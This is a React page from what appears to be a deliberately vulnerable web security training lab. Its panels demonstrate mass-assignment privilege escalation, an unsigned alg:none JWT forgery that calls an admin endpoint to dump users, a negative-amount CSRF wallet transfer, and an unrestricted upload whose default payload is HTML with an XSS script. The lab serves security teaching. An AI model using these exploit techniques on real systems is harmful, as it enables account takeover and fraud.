"use client";

import React, { useEffect, useState } from "react";
import { UserCheck, Upload, Send, KeyRound, Zap } from "lucide-react";
import { useLab } from "@/components/LabProvider";

export default function ProfilePage() {
  const { currentUser, securityLevel, refreshLabState } = useLab();
  const [profile, setProfile] = useState<any>(null);
  const [uploads, setUploads] = useState<any[]>([]);

  // Mass assignment form
  const [fullName, setFullName] = useState("");
  const [shippingAddress, setShippingAddress] = useState("");
  const [injectedRole, setInjectedRole] = useState("customer");
  const [injectedWallet, setInjectedWallet] = useState<string>("");
  const [profileResult, setProfileResult] = useState<any>(null);

  // CSRF / Wallet Transfer
  const [toUsername, setToUsername] = useState("bob");
  const [transferAmount, setTransferAmount] = useState<number>(25);
  const [transferResult, setTransferResult] = useState<any>(null);

  // Unrestricted File Upload
  const [filename, setFilename] = useState("exploit.php.html");
  const [contentType, setContentType] = useState("text/html");
  const [contentText, setContentText] = useState(
    `<html><body style="background:#0f172a;color:#38bdf8;font-family:monospace;padding:24px"><h1>FLAG{UNRESTRICTED_FILE_UPLOAD_XSS}</h1><script>alert('Uploaded HTML/SVG Executed on Origin: ' + document.domain)</script></body></html>`
  );
  const [uploadResult, setUploadResult] = useState<any>(null);

  // JWT alg:none forge demo
  const [forgedJwtResponse, setForgedJwtResponse] = useState<any>(null);

  const loadProfileData = async () => {
    const uid = currentUser?.id || 1;
    const res = await fetch(`/api/users/profile?userId=${uid}`);
    if (res.ok) {
      const data = await res.json();
      setProfile(data.profile);
      setUploads(data.uploads || []);
      if (data.profile) {
        setFullName(data.profile.full_name || "");
        setShippingAddress(data.profile.shipping_address || "");
        setInjectedRole(data.profile.role || "customer");
        setInjectedWallet(String(data.profile.wallet_balance || "150"));
      }
    }
  };

  useEffect(() => {
    loadProfileData();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentUser?.id, securityLevel]);

  const handleMassAssignmentUpdate = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/users/profile", {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: currentUser?.id || 1,
        full_name: fullName,
        shipping_address: shippingAddress,
        role: injectedRole,
        wallet_balance: Number(injectedWallet),
      }),
    });
    const data = await res.json();
    setProfileResult(data);
    await loadProfileData();
    await refreshLabState();
  };

  const handleWalletTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/wallet/transfer", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        fromUserId: currentUser?.id || 1,
        toUsername,
        amount: transferAmount,
      }),
    });
    const data = await res.json();
    setTransferResult(data);
    await loadProfileData();
    await refreshLabState();
  };

  const handleFileUpload = async (e: React.FormEvent) => {
    e.preventDefault();
    const res = await fetch("/api/upload", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: currentUser?.id || 1,
        filename,
        content_type: contentType,
        content_text: contentText,
      }),
    });
    const data = await res.json();
    setUploadResult(data);
    await loadProfileData();
    await refreshLabState();
  };

  const runJwtAlgNoneExploit = async () => {
    // Construct unsigned JWT with alg: "none" and role: "admin"
    const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" })).replace(
      /=/g,
      ""
    );
    const payload = btoa(
      JSON.stringify({
        sub: 3,
        username: "admin",
        email: "admin@vulnlab.local",
        role: "admin",
      })
    ).replace(/=/g, "");
    const unsignedToken = `${header}.${payload}.`;

    const res = await fetch("/api/admin/users", {
      headers: {
        Authorization: `Bearer ${unsignedToken}`,
      },
    });
    const data = await res.json();
    setForgedJwtResponse({
      forgedToken: unsignedToken,
      status: res.status,
      data,
    });
    await refreshLabState();
  };

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 gap-6 lg:grid-cols-2">
        {/* 1. AUTHZ-02 Mass Assignment */}
        <form
          onSubmit={handleMassAssignmentUpdate}
          className="space-y-4 rounded-2xl border border-slate-800 bg-slate-900/70 p-6"
        >
          <div className="flex items-center gap-2 text-indigo-300 font-bold">
            <UserCheck className="h-5 w-5" />
            <h2>
              Profile & Mass Assignment Escalation (AUTHZ-02)
            </h2>
          </div>
          <p className="text-xs text-slate-400">
            The <code className="text-white">PUT /api/users/profile</code>{" "}
            endpoint binds all JSON properties directly into the SQL update on
            Low/Medium difficulty—allowing you to escalate{" "}
            <code className="text-rose-300">role=&quot;admin&quot;</code> and
            overwrite <code className="text-emerald-300">wallet_balance</code>.
          </p>

          <button
            type="button"
            onClick={() => {
              setInjectedRole("admin");
              setInjectedWallet("99999");
            }}
            className="inline-flex items-center gap-1 rounded-lg border border-rose-500/40 bg-rose-500/10 px-3 py-1.5 text-xs text-rose-300 hover:bg-rose-500/20 cursor-pointer"
          >
            <Zap className="h-3.5 w-3.5" />
            Inject Mass Assignment: role=&quot;admin&quot; & wallet=$99,999
          </button>

          <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
            <div>
              <label className="block text-xs text-slate-400 mb-1">
                Full Name
              </label>
              <input
                type="text"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 text-xs text-white"
              />
            </div>
            <div>
              <label className="block text-xs text-slate-400 mb-1">
                Shipping Address
              </label>
              <input
                type="text"
                value={shippingAddress}
                onChange={(e) => setShippingAddress(e.target.value)}
                className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 text-xs text-white"
              />
            </div>
            <div>
              <label className="block text-xs text-rose-300 mb-1 font-mono">
                Mass-Assigned Role (role)
              </label>
              <input
                type="text"
                value={injectedRole}
                onChange={(e) => setInjectedRole(e.target.value)}
                className="w-full rounded-lg border border-rose-500/40 bg-slate-950 px-3 py-2 text-xs font-mono text-rose-300"
              />
            </div>
            <div>
              <label className="block text-xs text-emerald-300 mb-1 font-mono">
                Mass-Assigned Wallet (wallet_balance)
              </label>
              <input
                type="number"
                value={injectedWallet}
                onChange={(e) => setInjectedWallet(e.target.value)}
                className="w-full rounded-lg border border-emerald-500/40 bg-slate-950 px-3 py-2 text-xs font-mono text-emerald-300"
              />
            </div>
          </div>

          <button
            type="submit"
            className="rounded-xl bg-indigo-600 px-4 py-2 text-xs font-semibold text-white hover:bg-indigo-500 cursor-pointer"
          >
            Update Profile (PUT /api/users/profile)
          </button>

          {profileResult && (
            <pre className="overflow-x-auto rounded-xl border border-slate-800 bg-slate-950 p-3 font-mono text-xs text-slate-200">
              {JSON.stringify(profileResult, null, 2)}
            </pre>
          )}
        </form>

        {/* 2. AUTH-05 JWT alg:none Forgery + SESS-03 CSRF Wallet Transfer */}
        <div className="space-y-6">
          <div className="space-y-3 rounded-2xl border border-slate-800 bg-slate-900/70 p-6">
            <div className="flex items-center gap-2 text-amber-300 font-bold">
              <KeyRound className="h-5 w-5" />
              <h2>JWT Algorithm &quot;none&quot; Forgery (AUTH-05)</h2>
            </div>
            <p className="text-xs text-slate-400">
              Forges an unsigned JWT with{" "}
              <code className="text-white">{`{"alg":"none","typ":"JWT"}`}</code>{" "}
              and{" "}
              <code className="text-white">{`{"sub":3,"role":"admin"}`}</code>{" "}
              and calls <code className="text-white">GET /api/admin/users</code>.
            </p>
            <button
              type="button"
              onClick={runJwtAlgNoneExploit}
              className="inline-flex items-center gap-1.5 rounded-xl bg-amber-600 px-4 py-2 text-xs font-semibold text-white hover:bg-amber-500 cursor-pointer"
            >
              <Zap className="h-3.5 w-3.5" />
              Forge Unsigned Admin JWT & Dump Users
            </button>

            {forgedJwtResponse && (
              <div className="rounded-xl border border-slate-800 bg-slate-950 p-3 font-mono text-xs space-y-1.5">
                <div className="text-amber-300 break-all">
                  Authorization: Bearer {forgedJwtResponse.forgedToken}
                </div>
                <pre className="max-h-40 overflow-y-auto text-emerald-300">
                  {JSON.stringify(forgedJwtResponse.data, null, 2)}
                </pre>
              </div>
            )}
          </div>

          <form
            onSubmit={handleWalletTransfer}
            className="space-y-3 rounded-2xl border border-slate-800 bg-slate-900/70 p-6"
          >
            <div className="flex items-center gap-2 text-emerald-300 font-bold">
              <Send className="h-5 w-5" />
              <h2>Wallet Transfer (SESS-03 CSRF & Negative Transfer)</h2>
            </div>
            <p className="text-xs text-slate-400">
              Accepts state-changing transfers without an anti-CSRF token.{" "}
              <strong>Tip:</strong> Enter a negative amount (e.g.{" "}
              <code>-500</code>) to pull funds from Bob&apos;s wallet into yours!
            </p>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-xs text-slate-400 mb-1">
                  Recipient Username
                </label>
                <input
                  type="text"
                  value={toUsername}
                  onChange={(e) => setToUsername(e.target.value)}
                  className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-1.5 text-xs text-white"
                />
              </div>
              <div>
                <label className="block text-xs text-slate-400 mb-1">
                  Amount ($ — Try -500)
                </label>
                <input
                  type="number"
                  value={transferAmount}
                  onChange={(e) => setTransferAmount(Number(e.target.value))}
                  className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-1.5 text-xs font-mono text-emerald-300"
                />
              </div>
            </div>

            <button
              type="submit"
              className="rounded-xl bg-emerald-600 px-4 py-2 text-xs font-semibold text-white hover:bg-emerald-500 cursor-pointer"
            >
              Execute Wallet Transfer
            </button>

            {transferResult && (
              <pre className="overflow-x-auto rounded-xl border border-slate-800 bg-slate-950 p-3 font-mono text-xs text-slate-200">
                {JSON.stringify(transferResult, null, 2)}
              </pre>
            )}
          </form>
        </div>
      </div>

      {/* 3. BIZ-03 Unrestricted File Upload */}
      <form
        onSubmit={handleFileUpload}
        className="space-y-4 rounded-2xl border border-slate-800 bg-slate-900/70 p-6"
      >
        <div className="flex items-center gap-2 text-rose-300 font-bold">
          <Upload className="h-5 w-5" />
          <h2>
            Unrestricted File Upload Lab (BIZ-03 / BIZ-04)
          </h2>
        </div>
        <p className="text-xs text-slate-400">
          Upload arbitrary HTML, SVG, or double-extension files (
          <code>exploit.php.html</code>) and serve them directly from{" "}
          <code>/api/upload?id=...</code> with raw client-supplied MIME types.
        </p>

        <div className="grid grid-cols-1 gap-3 sm:grid-cols-2">
          <div>
            <label className="block text-xs text-slate-400 mb-1">
              Filename
            </label>
            <input
              type="text"
              value={filename}
              onChange={(e) => setFilename(e.target.value)}
              className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 text-xs font-mono text-white"
            />
          </div>
          <div>
            <label className="block text-xs text-slate-400 mb-1">
              Content-Type Header
            </label>
            <input
              type="text"
              value={contentType}
              onChange={(e) => setContentType(e.target.value)}
              className="w-full rounded-lg border border-slate-700 bg-slate-950 px-3 py-2 text-xs font-mono text-amber-300"
            />
          </div>
        </div>

        <div>
          <label className="block text-xs text-slate-400 mb-1">
            File Payload Content
          </label>
          <textarea
            rows={3}
            value={contentText}
            onChange={(e) => setContentText(e.target.value)}
            className="w-full rounded-lg border border-slate-700 bg-slate-950 p-3 font-mono text-xs text-emerald-300"
          />
        </div>

        <div className="flex flex-wrap items-center gap-4">
          <button
            type="submit"
            className="rounded-xl bg-rose-600 px-5 py-2 text-xs font-semibold text-white hover:bg-rose-500 cursor-pointer"
          >
            Upload File
          </button>

          {uploadResult?.viewUrl && (
            <a
              href={uploadResult.viewUrl}
              target="_blank"
              rel="noreferrer"
              className="text-xs font-mono font-bold text-indigo-300 underline"
            >
              Open Uploaded Payload: {uploadResult.viewUrl} ↗
            </a>
          )}
        </div>

        {uploads.length > 0 && (
          <div className="pt-2 text-xs text-slate-400">
            Uploaded Files:{" "}
            {uploads.map((u) => (
              <a
                key={u.id}
                href={`/api/upload?id=${u.id}`}
                target="_blank"
                rel="noreferrer"
                className="mr-3 font-mono text-indigo-400 underline"
              >
                #{u.id} {u.filename} ({u.content_type})
              </a>
            ))}
          </div>
        )}
      </form>
    </div>
  );
}

